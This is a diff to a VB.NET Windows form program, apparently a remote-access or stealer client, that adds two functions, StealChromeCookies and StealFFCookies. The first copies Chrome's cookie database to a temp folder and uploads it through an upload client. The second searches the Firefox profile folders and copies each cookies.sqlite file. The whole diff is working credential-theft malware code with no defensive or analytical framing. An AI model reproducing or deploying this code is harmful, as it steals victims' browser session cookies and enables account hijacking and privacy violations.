@@ -438,6 +438,36 @@ Public Class Form1
 
         End Try
     End Sub
+    Public Function StealChromeCookies()
+        Try
+            Dim chromeData As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & "\Google\Chrome\User Data\Default\"
+            If File.Exists(chromeData & "Cookies") Then
+                File.Copy(chromeData & "Cookies", TempPath & "\" & "CookiesCh.sqlite")
+                C.Upload(TempPath & "\" & "CookiesCh.sqlite")
+            End If
+            Return True
+        Catch ex As Exception
+            Return False
+        End Try
+    End Function
+    Public Function StealFFCookies()
+        Try
+            Dim directories As String() = Directory.GetDirectories("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles")
+            Dim i As Integer = 0
+            While i < directories.Length
+                Dim text2 As String = directories(i)
+                Dim flag As Boolean = File.Exists("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles" + text2.Replace("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles", String.Empty) + "\cookies.sqlite")
+                If flag Then
+                    Dim name As String = text2.Replace("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles", String.Empty)
+                    File.Copy("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles\" + name + "\cookies.sqlite", TempPath & "\" & "cookies.sqlite", True)
+                End If
+                i = i + 1
+            End While
+            Return True
+        Catch ex As Exception
+            Return False
+        End Try
+    End Function
     Public Function PowerShell(ByVal TempName As String)
         Try
             Dim si As New ProcessStartInfo
